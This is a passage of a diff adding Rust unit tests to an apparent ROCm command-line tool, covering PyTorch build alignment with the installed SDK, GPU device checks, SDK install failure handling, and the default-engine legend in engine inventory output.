+                    error: "device kernel image is invalid".to_owned(),
+                },
+                pin
+            ),
+            TorchRetention::Realign
+        );
+        // No answer is not an answer.
+        assert_eq!(
+            classify_retained_torch(
+                Some("rocm7.13.0"),
+                &RuntimeDeviceCheck::NotVerified("torch did not import".to_owned()),
+                pin
+            ),
+            TorchRetention::Realign
+        );
+        // Nothing pins torch, so there is no release to hold either build of.
+        assert_eq!(
+            classify_retained_torch(Some("rocm7.13.0"), &usable("2.11.0+gitd0c8b1f"), None),
+            TorchRetention::Realign
+        );
+        // A range is not an exact pin, so it cannot identify the engine's build.
+        assert_eq!(
+            classify_retained_torch(
+                Some("rocm7.13.0"),
+                &usable("2.11.0+gitd0c8b1f"),
+                Some("torch>=2.10")
+            ),
+            TorchRetention::Realign
+        );
+        // The manifest does not say what the SDK's build is, so a torch that is
+        // not the engine's pin cannot be recognised as the other intended one.
+        assert_eq!(
+            classify_retained_torch(None, &usable("2.11.0+rocm7.13.0"), pin),
+            TorchRetention::Realign
+        );
+        // Nothing is retained, so nothing is reported in place of the repair.
+        assert!(render_torch_retention(&TorchRetention::Realign, "vllm").is_empty());
+        assert_eq!(retained_diverged_package(&TorchRetention::Realign), None);
+    }
+
+    fn sdk_install_finalization() -> SdkInstallFinalization {
+        SdkInstallFinalization {
+            runtime_key: "wheel-gfx942-7.13.0".to_owned(),
+            install_root: PathBuf::from("/tmp/does-not-need-to-exist"),
+            family: "gfx94X-dcgpu".to_owned(),
+            previous_runtime_key: None,
+        }
+    }
+
+    /// Run the real `install sdk` completion path against a stubbed auto-install.
+    fn finish_sdk_install_with(
+        paths: &AppPaths,
+        outcome: Result<()>,
+    ) -> (Result<()>, SdkInstallFinalization) {
+        let finalized = sdk_install_finalization();
+        let result = finish_sdk_install(
+            paths,
+            Some(&finalized),
+            "install_sdk",
+            "sdk install completed".to_owned(),
+            |_, _| outcome,
+        );
+        (result, finalized)
+    }
+
+    #[test]
+    fn install_sdk_fails_when_the_install_left_a_runtime_that_cannot_open_a_device() -> Result<()> {
+        let (_root, paths) = test_paths("install-sdk-unusable");
+
+        // Exercises the command's own completion path, not just the predicate: if the
+        // catch goes back to warning and falling through, this fails.
+        let (result, _) = finish_sdk_install_with(
+            &paths,
+            Err(unusable_runtime_error("vllm", "wheel-gfx942-7.13.0")),
+        );
+        let error = result.expect_err("an unusable runtime must fail `install sdk`");
+        // And it must still say the SDK survived, so a transient index failure does
+        // not read as a ruined install that has to be started from scratch.
+        assert!(
+            error
+                .to_string()
+                .contains("The ROCm SDK itself is installed"),
+            "the failure must say the SDK survived:\n{error}"
+        );
+
+        // The SDK install did complete, so its record is written before the command
+        // fails — otherwise the audit trail would show an install that never happened.
+        let actions: Vec<String> = load_recent_audit_events(&paths, 10)?
+            .into_iter()
+            .map(|event| event.action)
+            .collect();
+        assert!(
+            actions.iter().any(|action| action == "install_sdk"),
+            "the successful SDK install was not recorded before failing: {actions:?}"
+        );
+        Ok(())
+    }
+
+    #[test]
+    fn install_sdk_survives_an_engine_install_failure() -> Result<()> {
+        let (_root, paths) = test_paths("install-sdk-engine-failure");
+
+        // The complement, and the reason the catch exists at all: the SDK is installed
+        // and usable, only a separately retryable step is missing. Failing here would
+        // throw away a multi-gigabyte install over an unreachable engine index.
+        let (result, _) = finish_sdk_install_with(
+            &paths,
+            Err(anyhow::anyhow!(
+                "failed to reach the engine index: dns error"
+            )),
+        );
+        assert!(
+            result.is_ok(),
+            "an engine install failure must not discard a good SDK install: {:?}",
+            result.err()
+        );
+
+        let actions: Vec<String> = load_recent_audit_events(&paths, 10)?
+            .into_iter()
+            .map(|event| event.action)
+            .collect();
+        assert!(actions.iter().any(|action| action == "install_sdk"));
+        assert!(
+            actions.iter().any(|action| action == "engine_auto_install"),
+            "the engine failure must still be recorded: {actions:?}"
+        );
+        Ok(())
+    }
+
+    #[test]
+    fn the_unusable_runtime_failure_survives_being_wrapped_in_context() {
+        // The error reaches the catch through several `?` hops. Flattening it into a
+        // plain message is the realistic way a later change silently restores the
+        // exit-0 bug, since every failure would then look recoverable.
+        let propagated: Result<()> = Err(unusable_runtime_error("vllm", "wheel-gfx942-7.13.0"))
+            .context("automatic vLLM install failed");
+        let propagated = propagated.expect_err("expected the unusable-runtime error");
+        assert!(engine_auto_install_failure_is_fatal(&propagated));
+        assert!(!engine_auto_install_failure_is_fatal(&anyhow::anyhow!(
+            "uv exited with status 1"
+        )));
+    }
+
+    #[test]
+    fn an_install_failure_is_not_reported_as_a_missing_wheel() {
+        // Saying "the index publishes no such build" over a network or disk error
+        // sends the reader hunting for a wheel that exists. Anything the resolver
+        // did not actually attribute to a missing version degrades to the honest
+        // answer: the failure, verbatim.
+        assert!(!install_error_reports_version_unavailable(
+            "failed to launch uv: Permission denied"
+        ));
+        assert!(!install_error_reports_version_unavailable(
+            "error sending request: dns error: failed to lookup address"
+        ));
+        assert!(install_error_reports_version_unavailable(
+            "No solution found when resolving: torch==2.10.0+rocm7.14.0a20260611"
+        ));
+    }
+
+    #[test]
+    fn an_unresolvable_version_still_reads_as_unavailable() {
+        let rendered = render_torch_alignment(
+            &TorchAlignment::Unavailable {
+                wanted: "2.10.0+rocm7.14.0a20260611".to_owned(),
+                kept: "2.10.0+git8514f05".to_owned(),
+            },
+            "vllm",
+            None,
+        );
+
+        assert!(rendered.contains("  torch_alignment: unavailable\n"));
+        assert!(rendered.contains("publishes no 2.10.0+rocm7.14.0a20260611"));
+    }
+
+    #[test]
+    fn a_failed_realignment_reports_the_error_it_actually_hit() {
+        let rendered = render_torch_alignment(
+            &TorchAlignment::InstallFailed {
+                wanted: "2.11.0+rocm7.13.0".to_owned(),
+                kept: "2.11.0+gitd0c8b1f".to_owned(),
+                error: "failed to launch uv: Permission denied".to_owned(),
+            },
+            "vllm",
+            None,
+        );
+
+        assert!(rendered.contains("  torch_alignment: install_failed\n"));
+        assert!(rendered.contains("Permission denied"));
+        assert!(
+            !rendered.contains("publishes no"),
+            "an install failure must not be described as a missing wheel: {rendered}"
+        );
+    }
+
+    #[test]
+    fn a_realigned_runtime_names_both_builds_and_the_engine_that_decided_the_release() {
+        // The line a successful run actually prints, and the one a user reads when
+        // deciding whether the divergence reported just below it is expected.
+        let rendered = render_torch_alignment(
+            &TorchAlignment::Realigned {
+                from: "2.11.0+gitd0c8b1f".to_owned(),
+                to: "2.11.0+rocm7.13.0".to_owned(),
+            },
+            "vllm",
+            None,
+        );
+
+        assert!(rendered.contains("  torch_alignment: realigned\n"));
+        assert!(rendered.contains("2.11.0+gitd0c8b1f -> 2.11.0+rocm7.13.0"));
+        assert!(
+            rendered.contains("the release vllm pins"),
+            "the engine that pinned the release is named rather than left anonymous: {rendered}"
+        );
+    }
+
+    #[test]
+    fn a_realignment_reports_what_the_runtime_could_do_before_it() {
+        // The whole point of the line: the device_check printed afterwards is the
+        // after state, so without this one a realignment that ends badly does not
+        // say whether it broke a working runtime or repaired a broken one. Here it
+        // repaired one, and the output says so without anyone visiting the machine.
+        let rendered = render_torch_alignment(
+            &TorchAlignment::Realigned {
+                from: "2.11.0+rocm7.14.0".to_owned(),
+                to: "2.11.0+rocm7.13.0".to_owned(),
+            },
+            "vllm",
+            Some(&RuntimeDeviceCheck::KernelFailed {
+                torch_version: "2.11.0+rocm7.14.0".to_owned(),
+                error: "HIP error: hipErrorInvalidImage".to_owned(),
+            }),
+        );
+
+        assert!(
+            rendered.contains("before this replacement: kernel_failed (torch 2.11.0+rocm7.14.0)"),
+            "the before verdict names itself and the torch it judged: {rendered}"
+        );
+        assert!(
+            rendered.contains("device_check below is after it"),
+            "the reader is told which of the two blocks is which: {rendered}"
+        );
+    }
+
+    #[test]
+    fn only_a_realignment_reports_a_before_verdict() {
+        // Every other outcome left the runtime as it was, so the device_check
+        // below is already about the same torch this block names. A before/after
+        // pair there would invite reading a change into an outcome that made none.
+        let before = RuntimeDeviceCheck::Usable {
+            device_count: 1,
+            torch_version: "2.11.0+rocm7.13.0".to_owned(),
+        };
+
+        for outcome in [
+            TorchAlignment::AlreadyAligned {
+                version: "2.11.0+rocm7.13.0".to_owned(),
+            },
+            TorchAlignment::Disabled {
+                wanted: "2.11.0+rocm7.13.0".to_owned(),
+                kept: "2.9.0+cpu".to_owned(),
+            },
+            TorchAlignment::Unavailable {
+                wanted: "2.11.0+rocm7.13.0".to_owned(),
+                kept: "2.11.0+gitd0c8b1f".to_owned(),
+            },
+        ] {
+            let rendered = render_torch_alignment(&outcome, "vllm", Some(&before));
+            assert!(
+                !rendered.contains("before this replacement"),
+                "{outcome:?} replaced nothing: {rendered}"
+            );
+        }
+    }
+
+    #[test]
+    fn an_already_aligned_runtime_reports_the_version_it_kept() {
+        // Every refresh after the first lands here, so this is the most frequently
+        // printed of the five outcomes.
+        let rendered = render_torch_alignment(
+            &TorchAlignment::AlreadyAligned {
+                version: "2.11.0+rocm7.13.0".to_owned(),
+            },
+            "vllm",
+            None,
+        );
+
+        assert!(rendered.contains("  torch_alignment: already_aligned (2.11.0+rocm7.13.0)\n"));
+    }
+
+    #[test]
+    fn a_managed_python_runtime_is_settled() {
+        assert!(settles_runtime_torch("vllm", Some(true)));
+        assert!(
+            settles_runtime_torch("vllm", None),
+            "an engine that does not report the field is still assumed managed, as before"
+        );
+    }
+
+    #[test]
+    fn an_external_runtime_is_left_alone() {
+        assert!(!settles_runtime_torch("vllm", Some(false)));
+    }
+
+    #[test]
+    fn an_engine_that_manages_its_own_runtime_is_left_alone() {
+        // Lemonade reports `managed_env: Some(true)` — rocm-cli did create the
+        // runtime — but its `python_executable` is the Lemonade binary, not an
+        // interpreter, and no torch ever lived there. Settling it would spawn that
+        // binary twice with a generated `.py` path as `argv[1]` and print torch and
+        // device check blocks for a runtime that has neither, on the serve path.
+        assert!(!settles_runtime_torch("lemonade", Some(true)));
+    }
+
+    #[test]
+    fn an_already_correct_runtime_is_left_alone() {
+        let plan = plan_torch_alignment(
+            Some("rocm7.13.0"),
+            Some("2.11.0+rocm7.13.0"),
+            Some("torch==2.11.0+gitd0c8b1f"),
+            "vllm",
+        );
+
+        assert_eq!(
+            plan,
+            TorchAlignmentPlan::AlreadyAligned {
+                version: "2.11.0+rocm7.13.0".to_owned()
+            }
+        );
+    }
+
+    #[test]
+    fn a_loose_torch_requirement_is_not_second_guessed() {
+        // Without an exact pin there is no release to carry over, so the engine's
+        // resolution stands rather than being overridden on a guess.
+        let plan = plan_torch_alignment(
+            Some("rocm7.13.0"),
+            Some("2.11.0+gitd0c8b1f"),
+            Some("torch>=2.10"),
+            "vllm",
+        );
+
+        assert!(
+            matches!(plan, TorchAlignmentPlan::NotApplicable(reason) if reason.contains("exact")),
+            "a non-pinned requirement must be left alone"
+        );
+    }
+
+    #[test]
+    fn an_unidentified_sdk_build_is_not_acted_on() {
+        // Nothing to carry over, so guessing a build would be worse than doing
+        // nothing and letting the device check report the result.
+        let plan = plan_torch_alignment(
+            None,
+            Some("2.11.0+gitd0c8b1f"),
+            Some("torch==2.11.0+gitd0c8b1f"),
+            "vllm",
+        );
+
+        assert!(matches!(plan, TorchAlignmentPlan::NotApplicable(_)));
+    }
+
+    /// The build comes from the manifest, not from whatever torch is installed.
+    ///
+    /// This is what makes a runtime already overwritten by the engine recoverable:
+    /// reading the environment would call the engine's build the SDK's and leave the
+    /// runtime broken for good. `plan_torch_alignment` takes the build as an opaque
+    /// argument, so the property lives here, in the lookup that produces it.
+    #[test]
+    fn the_sdk_build_is_read_from_the_manifest_not_the_environment() {
+        let mut manifest =
+            test_runtime_manifest_for_update("wheel-gfx94x", "gfx94x", "gfx94x-dcgpu", "7.13.0");
+        manifest.sdk_torch = Some("2.11.0+rocm7.13.0".to_owned());
+
+        assert_eq!(
+            sdk_torch_build_from_manifest(&manifest).as_deref(),
+            Some("rocm7.13.0"),
+            "the recorded SDK torch names the build"
+        );
+    }
+
+    /// Manifests written before `sdk_torch` existed still have to yield a build.
+    ///
+    /// These are the runtimes already on real machines, so this fallback is the
+    /// repair path rather than a nicety. TheRock names the build `rocm<version>`.
+    #[test]
+    fn a_manifest_without_a_recorded_torch_derives_the_build_from_the_sdk_version() {
+        let manifest =
+            test_runtime_manifest_for_update("wheel-gfx94x", "gfx94x", "gfx94x-dcgpu", "7.13.0");
+        assert!(
+            manifest.sdk_torch.is_none(),
+            "this test is about the pre-change manifest shape"
+        );
+
+        assert_eq!(
+            sdk_torch_build_from_manifest(&manifest).as_deref(),
+            Some("rocm7.13.0")
+        );
+    }
+
+    /// A dated alpha carries its date into the build, and must not be trimmed.
+    ///
+    /// Nightly SDKs version as `7.14.0a20260812`, and TheRock's torch for one is
+    /// `+rocm7.14.0a20260812` — the date is part of the build, not decoration on
+    /// the version. Shortening it to the `7.14.0` release would name a build that
+    /// exists for a different SDK, so the alignment would install a torch built
+    /// against libraries the runtime does not have. The fallback is a whole-string
+    /// interpolation today; this pins that, because the tempting "clean up the
+    /// version first" refactor is the one that breaks every nightly runtime.
+    #[test]
+    fn a_dated_alpha_sdk_keeps_its_date_in_the_derived_build() {
+        let manifest = test_runtime_manifest_for_update(
+            "wheel-gfx94x",
+            "gfx94x",
+            "gfx94x-dcgpu",
+            "7.14.0a20260812",
+        );
+        assert!(
+            manifest.sdk_torch.is_none(),
+            "this test is about the pre-change manifest shape"
+        );
+
+        assert_eq!(
+            sdk_torch_build_from_manifest(&manifest).as_deref(),
+            Some("rocm7.14.0a20260812")
+        );
+    }
+
+    /// A manifest that names no version at all must not invent a build.
+    #[test]
+    fn a_manifest_with_no_version_identifies_no_build() {
+        let mut manifest =
+            test_runtime_manifest_for_update("wheel-gfx94x", "gfx94x", "gfx94x-dcgpu", "  ");
+        manifest.sdk_torch = None;
+
+        assert_eq!(sdk_torch_build_from_manifest(&manifest), None);
+    }
+
+    /// Two runtimes installed side by side, as a pre-warmed CI tree holds them.
+    ///
+    /// They differ in `runtime_key`, `version` and install root, and share one
+    /// `runtime_id` — that is what the field means, so this is not a corrupt
+    /// registry.
+    fn side_by_side_runtimes() -> Vec<therock::InstalledRuntimeManifest> {
+        let mut older = test_runtime_manifest_for_update(
+            "release-wheel-gfx94x-dcgpu-7-13-0",
+            "therock-release:gfx94X-dcgpu",
+            "gfx94X-dcgpu",
+            "7.13.0",
+        );
+        older.install_root = PathBuf::from("/runtimes/release-wheel-gfx94x-dcgpu-7-13-0");
+        let mut newer = test_runtime_manifest_for_update(
+            "release-wheel-gfx94x-dcgpu-7-14-0",
+            "therock-release:gfx94X-dcgpu",
+            "gfx94X-dcgpu",
+            "7.14.0",
+        );
+        newer.install_root = PathBuf::from("/runtimes/release-wheel-gfx94x-dcgpu-7-14-0");
+        vec![older, newer]
+    }
+
+    /// The interpreter names its runtime where the shared `runtime_id` cannot.
+    ///
+    /// This is the cross-wiring that settled the active runtime's torch into an
+    /// older runtime's environment: the engine's env id drops the version, so
+    /// the environment belongs to 7.13.0 while the caller's selector says only
+    /// "release, gfx94X-dcgpu". Resolving by install root has to pick 7.13.0.
+    #[test]
+    fn the_runtime_is_resolved_by_its_interpreter_not_the_shared_runtime_id() {
+        let manifests = side_by_side_runtimes();
+
+        assert_eq!(
+            runtime_manifest_for_selector(&manifests, "therock-release:gfx94X-dcgpu")
+                .map(|manifest| manifest.runtime_key.as_str()),
+            None,
+            "the shared runtime_id names two runtimes, so a selector cannot resolve it"
+        );
+        assert_eq!(
+            runtime_key_owning_python(
+                &manifests,
+                Path::new("/runtimes/release-wheel-gfx94x-dcgpu-7-13-0/bin/python3"),
+            ),
+            Some("release-wheel-gfx94x-dcgpu-7-13-0"),
+            "the interpreter's install root names the runtime being settled"
+        );
+    }
+
+    /// An interpreter outside every install root leaves the caller's selector alone.
+    ///
+    /// External and self-managed environments live outside the registry, and
+    /// inventing an owner for them would settle a runtime nobody asked about.
+    #[test]
+    fn an_interpreter_outside_every_install_root_owns_nothing() {
+        assert_eq!(
+            runtime_key_owning_python(
+                &side_by_side_runtimes(),
+                Path::new("/opt/somewhere-else/bin/python3"),
+            ),
+            None
+        );
+    }
+
+    /// A prefix match alone is ambiguous once roots nest, so the longest wins.
+    #[test]
+    fn the_longest_containing_install_root_owns_the_interpreter() {
+        let mut outer = test_runtime_manifest_for_update(
+            "outer",
+            "therock-release:gfx94X-dcgpu",
+            "gfx94X-dcgpu",
+            "7.13.0",
+        );
+        outer.install_root = PathBuf::from("/runtimes");
+        let mut inner = test_runtime_manifest_for_update(
+            "inner",
+            "therock-release:gfx94X-dcgpu",
+            "gfx94X-dcgpu",
+            "7.14.0",
+        );
+        inner.install_root = PathBuf::from("/runtimes/release-wheel-gfx94x-dcgpu-7-14-0");
+
+        assert_eq!(
+            runtime_key_owning_python(
+                &[outer, inner],
+                Path::new("/runtimes/release-wheel-gfx94x-dcgpu-7-14-0/bin/python3"),
+            ),
+            Some("inner")
+        );
+    }
+
+    /// A torch the user installed themselves is kept, and named as kept.
+    ///
+    /// The Python does not exist and an index is supplied, so an alignment that
+    /// still ran would reach the install and come back `InstallFailed`. Getting
+    /// the divergence described instead — the build that was not installed, and
+    /// the one still there — is what shows the rewrite was skipped rather than
+    /// attempted and then reported differently.
+    #[test]
+    fn disabling_alignment_keeps_the_installed_torch_and_says_what_it_declined() {
+        let mut env = ScopedTestEnv::new();
+        env.set("ROCM_CLI_DISABLE_TORCH_ALIGNMENT", "1");
+        let probe = therock::TorchAlignmentProbe {
+            installed_torch: Some("2.9.0+cpu".to_owned()),
+            engine_requires_torch: Some("torch==2.11.0+gitd0c8b1f".to_owned()),
+        };
+
+        let outcome = align_runtime_torch(
+            &test_app_paths(),
+            Path::new("/nonexistent/python"),
+            Some("https://example.invalid/simple"),
+            Some("rocm7.13.0"),
+            "vllm",
+            Ok(&probe),
+        );
+
+        assert_eq!(
+            outcome,
+            TorchAlignment::Disabled {
+                wanted: "2.11.0+rocm7.13.0".to_owned(),
+                kept: "2.9.0+cpu".to_owned(),
+            }
+        );
+    }
+
+    /// Unset, the rewrite is attempted as usual.
+    ///
+    /// Paired with the test above so the opt-out cannot appear to work for an
+    /// unrelated reason. The index is withheld here on purpose: it is the first
+    /// thing read after the gate, so the call stops there rather than reaching a
+    /// real install, and the outcome still tells the two paths apart.
+    #[test]
+    fn alignment_runs_unless_the_variable_is_set() {
+        let mut env = ScopedTestEnv::new();
+        env.clear("ROCM_CLI_DISABLE_TORCH_ALIGNMENT");
+        let probe = therock::TorchAlignmentProbe {
+            installed_torch: Some("2.9.0+cpu".to_owned()),
+            engine_requires_torch: Some("torch==2.11.0+gitd0c8b1f".to_owned()),
+        };
+
+        let outcome = align_runtime_torch(
+            &test_app_paths(),
+            Path::new("/nonexistent/python"),
+            None,
+            Some("rocm7.13.0"),
+            "vllm",
+            Ok(&probe),
+        );
+
+        assert_eq!(
+            outcome,
+            TorchAlignment::NotApplicable(
+                "the runtime manifest records no wheel index to install from".to_owned()
+            ),
+            "the opt-out must not fire when the variable is unset"
+        );
+    }
+
+    /// Opting out of a rewrite that was never due reports the runtime as it is.
+    ///
+    /// `Disabled` says a replacement was declined. On a runtime already holding
+    /// the SDK's build there was none to decline, and saying otherwise would send
+    /// the reader looking for a torch that was spared when nothing was.
+    #[test]
+    fn disabling_alignment_over_an_aligned_runtime_still_reports_it_aligned() {
+        let mut env = ScopedTestEnv::new();
+        env.set("ROCM_CLI_DISABLE_TORCH_ALIGNMENT", "1");
+        let probe = therock::TorchAlignmentProbe {
+            installed_torch: Some("2.11.0+rocm7.13.0".to_owned()),
+            engine_requires_torch: Some("torch==2.11.0+gitd0c8b1f".to_owned()),
+        };
+
+        let outcome = align_runtime_torch(
+            &test_app_paths(),
+            Path::new("/nonexistent/python"),
+            Some("https://example.invalid/simple"),
+            Some("rocm7.13.0"),
+            "vllm",
+            Ok(&probe),
+        );
+
+        assert_eq!(
+            outcome,
+            TorchAlignment::AlreadyAligned {
+                version: "2.11.0+rocm7.13.0".to_owned(),
+            }
+        );
+    }
+
+    /// The kept torch is a deliberate divergence, and the remedy is not reinstall.
+    ///
+    /// The engine's pin is unsatisfied on purpose here, so reporting a violation
+    /// would answer the user's instruction with an error — and the remedy that
+    /// comes with it, `--reinstall`, is the one action that would undo the very
+    /// decision they made.
+    #[test]
+    fn a_disabled_alignment_diverges_on_torch_without_offering_a_reinstall() {
+        let outcome = TorchAlignment::Disabled {
+            wanted: "2.11.0+rocm7.13.0".to_owned(),
+            kept: "2.9.0+cpu".to_owned(),
+        };
+        assert_eq!(deliberately_diverged_package(&outcome), Some("torch"));
+
+        let rendered = render_torch_alignment(&outcome, "vllm", None);
+        assert!(
+            rendered.contains("  torch_alignment: disabled\n"),
+            "the block has to name the state, got {rendered:?}"
+        );
+        assert!(
+            rendered.contains(
+                "ROCM_CLI_DISABLE_TORCH_ALIGNMENT is set; keeping 2.9.0+cpu rather than installing 2.11.0+rocm7.13.0"
+            ),
+            "the block has to name the variable and both builds, got {rendered:?}"
+        );
+
+        let dependencies = classify_dependency_details(
+            vec![
+                "The package `vllm` requires `torch==2.11.0+gitd0c8b1f`, but `2.9.0+cpu` is installed".to_owned(),
+            ],
+            deliberately_diverged_package(&outcome),
+        );
+        assert!(matches!(
+            dependencies,
+            EngineDependencyCheck::ExpectedDivergence(_)
+        ));
+        let rendered = render_engine_dependency_check("vllm", &dependencies);
+        assert!(
+            !rendered.contains("--reinstall"),
+            "the remedy would undo the opt-out, got {rendered:?}"
+        );
+    }
+
+    /// Opting out suppresses the correction, not the diagnosis.
+    ///
+    /// The escape hatch exists because the SDK's build does not always work, so it
+    /// cannot also become a way to make a runtime that does not work pass. The
+    /// device check is taken over the torch the user kept and read exactly as it
+    /// would be otherwise: a host with a GPU the runtime cannot open, or can open
+    /// and then not run a kernel on, still fails the install.
+    #[test]
+    fn opting_out_still_fails_an_install_that_left_a_gpu_host_unable_to_serve() {
+        let no_devices = RuntimeDeviceCheck::NoDevices {
+            torch_version: "2.9.0+cpu".to_owned(),
+            hip_version: "7.2.53211".to_owned(),
+        };
+        let kernel_failed = RuntimeDeviceCheck::KernelFailed {
+            torch_version: "2.9.0+cpu".to_owned(),
+            error: "AcceleratorError: device kernel image is invalid".to_owned(),
+        };
+
+        assert!(install_left_runtime_unusable(
+            &no_devices,
+            &HostGpu::Detected
+        ));
+        assert!(install_left_runtime_unusable(
+            &kernel_failed,
+            &HostGpu::Detected
+        ));
+    }
+
+    /// On a machine with no GPU the same verdict is the correct answer.
+    ///
+    /// Someone running a CPU torch deliberately is the person this opt-out is for,
+    /// and a runtime reporting no device there has not failed at anything.
+    #[test]
+    fn opting_out_on_a_host_with_no_gpu_leaves_the_install_successful() {
+        let no_devices = RuntimeDeviceCheck::NoDevices {
+            torch_version: "2.9.0+cpu".to_owned(),
+            hip_version: "7.2.53211".to_owned(),
+        };
+
+        assert!(!install_left_runtime_unusable(
+            &no_devices,
+            &HostGpu::Absent
+        ));
+    }
+
+    #[test]
+    fn a_runtime_that_sees_no_devices_names_the_torch_that_cannot_use_the_sdk() {
+        // The install succeeded and the engine's requirements are satisfied, so
+        // every other surface reports this runtime healthy. Measured on MI300X:
+        // this torch loads against a ROCm 7.13 SDK and enumerates nothing, and
+        // the first symptom would otherwise be a serve failure.
+        let rendered = render_runtime_device_check(&RuntimeDeviceCheck::NoDevices {
+            torch_version: "2.11.0+gitd0c8b1f".to_owned(),
+            hip_version: "7.2.53211".to_owned(),
+        });
+
+        assert!(rendered.contains("  device_check: no_devices\n"));
+        assert!(rendered.contains("2.11.0+gitd0c8b1f"));
+        assert!(rendered.contains("7.2.53211"));
+        assert!(rendered.contains("Failed to infer device type"));
+        // No remedy is offered on purpose: reinstalling to satisfy the engine's
+        // pin is what produces this state.
+        assert!(
+            !rendered.contains("action:"),
+            "a remedy that recreates the fault must not be suggested: {rendered}"
+        );
+    }
+
+    #[test]
+    fn a_usable_runtime_states_how_many_devices_it_found() {
+        let rendered = render_runtime_device_check(&RuntimeDeviceCheck::Usable {
+            device_count: 8,
+            torch_version: "2.11.0+rocm7.13.0".to_owned(),
+        });
+
+        assert_eq!(
+            rendered,
+            "  device_check: usable (8 device(s), torch 2.11.0+rocm7.13.0)\n"
+        );
+    }
+
+    #[test]
+    fn a_device_check_without_an_interpreter_is_not_verified_not_healthy() {
+        // Same rule as the dependency check: absence of an answer is never
+        // allowed to read as a passing one.
+        let outcome = runtime_device_check(None, &[]);
+
+        assert_eq!(
+            outcome,
+            RuntimeDeviceCheck::NotVerified(
+                "the runtime's Python environment could not be located".to_owned()
+            )
+        );
+        assert!(render_runtime_device_check(&outcome).contains("not_verified"));
+    }
+
+    #[test]
+    fn an_unlocatable_environment_is_reported_not_assumed_healthy() {
+        // The engine install can fail before it reports its own interpreter. That path
+        // still prints a block, and with no interpreter to check it must say so rather
+        // than fall through to `satisfied`.
+        let (root, paths) = test_paths("engine-dependency-no-python");
+
+        let outcome = engine_dependency_check(&paths, "vllm", None, None);
+        let _ = fs::remove_dir_all(root);
+
+        assert_eq!(
+            outcome,
+            EngineDependencyCheck::NotVerified(
+                "the runtime's Python environment could not be located".to_owned()
+            )
+        );
+        assert!(
+            render_engine_dependency_check("vllm", &outcome).contains("not_verified"),
+            "the failure path still prints a dependency_check block"
+        );
+    }
+
+    #[test]
+    fn a_dependency_check_that_could_not_run_says_so_instead_of_claiming_health() {
+        let rendered = render_engine_dependency_check(
+            "vllm",
+            &EngineDependencyCheck::NotVerified("uv binary is unavailable\nofflinehost".to_owned()),
+        );
+
+        assert!(rendered.contains("not_verified"));
+        assert!(!rendered.contains("satisfied"));
+        // A multi-line failure must stay on one reported line.
+        assert_eq!(rendered.lines().count(), 1, "{rendered}");
+    }
+
+    #[test]
     fn render_engine_inventory_text_surfaces_external_plugin_policy() {
         let (root, paths) = test_paths("engine-plugin-policy");
 
@@ -24835,6 +34472,84 @@ ID_LIKE="suse opensuse"
         assert!(rendered.contains("ROCm GPU execution is required"));
         assert!(rendered.contains("Plugin folders:"));
         assert!(rendered.contains(&paths.primary_engine_plugin_dir().display().to_string()));
+    }
+
+    #[test]
+    fn render_engine_inventory_text_includes_marker_legend() {
+        let (root, paths) = test_paths("engine-inventory-marker-legend");
+        let host_default =
+            rocm_core::default_engine_for_host(&rocm_core::detect_host_gpu_summary(Some(&paths)));
+
+        let rendered = render_engine_inventory_text_with_paths(Some(&paths));
+        let _ = fs::remove_dir_all(root);
+
+        let legend = format!("legend: {DEFAULT_ENGINE_MARKER} = default engine");
+        let legend_pos = rendered.find(&legend).expect("legend line present");
+        // Anchor on the marked row itself (not just `"{DEFAULT_ENGINE_MARKER} "`,
+        // which also matches inside the legend line and would pass even if no
+        // row were actually marked).
+        let marker_pos = rendered
+            .find(&format!("{DEFAULT_ENGINE_MARKER} {host_default}"))
+            .expect("the default engine entry present");
+        assert!(
+            legend_pos < marker_pos,
+            "legend must appear before the entries it explains:\n{rendered}"
+        );
+    }
+
+    #[test]
+    fn render_engine_inventory_text_honors_configured_default_engine() {
+        // Regression: this renderer used to mark only `default_engine_for_host`,
+        // ignoring a configured `default_engine` — the same host-vs-configured
+        // precedence `select_serve_engine` and `append_examine_engine_inventory`
+        // already honor. Pick whichever engine the host does NOT prefer so the
+        // configured value is guaranteed to actually change the marked engine.
+        let (root, paths) = test_paths("engine-inventory-configured-default");
+        let host_default =
+            rocm_core::default_engine_for_host(&rocm_core::detect_host_gpu_summary(Some(&paths)));
+        let configured = if host_default == "vllm" {
+            "lemonade"
+        } else {
+            "vllm"
+        };
+        let config = RocmCliConfig {
+            default_engine: Some(configured.to_owned()),
+            ..RocmCliConfig::default()
+        };
+        config.save(&paths).expect("save config");
+
+        let rendered = render_engine_inventory_text_with_paths(Some(&paths));
+        let _ = fs::remove_dir_all(root);
+
+        assert!(
+            rendered.contains(&format!("{DEFAULT_ENGINE_MARKER} {configured}")),
+            "configured default engine {configured} must be marked; got:\n{rendered}"
+        );
+        assert!(
+            !rendered.contains(&format!("{DEFAULT_ENGINE_MARKER} {host_default}")),
+            "host default {host_default} must not be marked once a different engine is configured; got:\n{rendered}"
+        );
+    }
+
+    #[test]
+    fn render_engine_inventory_text_omits_legend_when_configured_default_matches_nothing() {
+        // A configured default naming an external plugin (or a stale/typo'd
+        // name) matches zero rows in `engine_inventory()`'s built-ins list —
+        // the legend would then explain a marker that appears nowhere.
+        let (root, paths) = test_paths("engine-inventory-unmatched-default");
+        let config = RocmCliConfig {
+            default_engine: Some("totally-unknown-plugin".to_owned()),
+            ..RocmCliConfig::default()
+        };
+        config.save(&paths).expect("save config");
+
+        let rendered = render_engine_inventory_text_with_paths(Some(&paths));
+        let _ = fs::remove_dir_all(root);
+
+        assert!(
+            !rendered.contains("legend:"),
+            "legend must be absent when the configured default matches no built-in engine; got:\n{rendered}"
+        );
     }
 
     #[test]
@@ -25495,6 +35210,47 @@ ID_LIKE="suse opensuse"
         let _ = fs::remove_dir_all(root);
     }
 
+    #[test]
+    fn examine_engine_inventory_includes_marker_legend() {
+        let (root, paths) = test_paths("examine-engine-inventory-marker-legend");
+        let config = RocmCliConfig::default();
+        let mut output = String::new();
+
+        append_examine_engine_inventory(&mut output, &paths, &config, "vllm");
+        let _ = fs::remove_dir_all(root);
+
+        let legend = format!("legend: {DEFAULT_ENGINE_MARKER} = default engine");
+        let legend_pos = output.find(&legend).expect("legend line present");
+        let marker_pos = output
+            .find(&format!("{DEFAULT_ENGINE_MARKER} vllm"))
+            .expect("the default engine entry present");
+        assert!(
+            legend_pos < marker_pos,
+            "legend must appear before the entries it explains:\n{output}"
+        );
+    }
+
+    #[test]
+    fn examine_engine_inventory_omits_legend_when_effective_default_matches_nothing() {
+        // Same gap as `render_engine_inventory_text_with_paths`: an effective
+        // default naming an external plugin (or a stale/typo'd name) matches
+        // zero rows in `engine_inventory()`'s built-ins list.
